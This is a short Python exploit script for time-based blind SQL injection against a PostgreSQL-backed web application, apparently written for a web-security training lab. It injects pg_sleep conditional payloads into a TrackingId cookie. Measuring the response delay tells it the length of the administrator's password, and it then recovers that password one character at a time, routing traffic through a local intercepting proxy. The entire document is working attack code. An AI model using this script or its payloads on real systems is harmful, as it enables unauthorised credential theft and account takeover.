# extract username and password using time-bases delay blind attacks.

import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http" : "http://127.0.0.1:8080",
    "https" : "http://127.0.0.1:8080"
}

def get_pass_len(url):
    for len in range (1,30):
        payload = "'|| (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users WHERE username='administrator' AND length(password)=%s) -- " %len

        cookie = {
        "TrackingId" : "vLw1RdxHG70mbmoP" + payload,
        "session" : "G60CuRoIeldJDosvvHenbuRkHGqCwhDV"
        }

        res = requests.get(url, cookies=cookie, verify=False, proxies=proxies)

        sys.stdout.write("\r" + str(len))
        sys.stdout.flush()

        if int(res.elapsed.total_seconds()) >= 10:
            return len
    return False

def get_admin_pass(url, pass_len):
    password = ""

    for i in range (1, pass_len+1):
        for j in range (32,127):
            chr_j = chr(j)
            payload = "' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users WHERE username='administrator' AND SUBSTRING(password,%s,1)='%s')-- " %(i,chr_j)

            cookie = {
                "TrackingId" : "vLw1RdxHG70mbmoP" + payload,
                "session" : "G60CuRoIeldJDosvvHenbuRkHGqCwhDV"
            }

            res = requests.get(url, cookies=cookie, verify=False, proxies=proxies)

            sys.stdout.write("\r"+ password + chr(j))
            sys.stdout.flush()

            if int(res.elapsed.total_seconds()) >= 10:
                password += chr(j)
                break
    return password

if __name__ == "__main__":
    try:
        url = sys.argv[1]
    except IndexError:
        print("[-] invalid input")
        sys.exit(-1)

    # find length of the password
    pass_len = get_pass_len(url)
    print()

    # find the password for username = 'administrator'
    admin_pass = get_admin_pass(url, pass_len)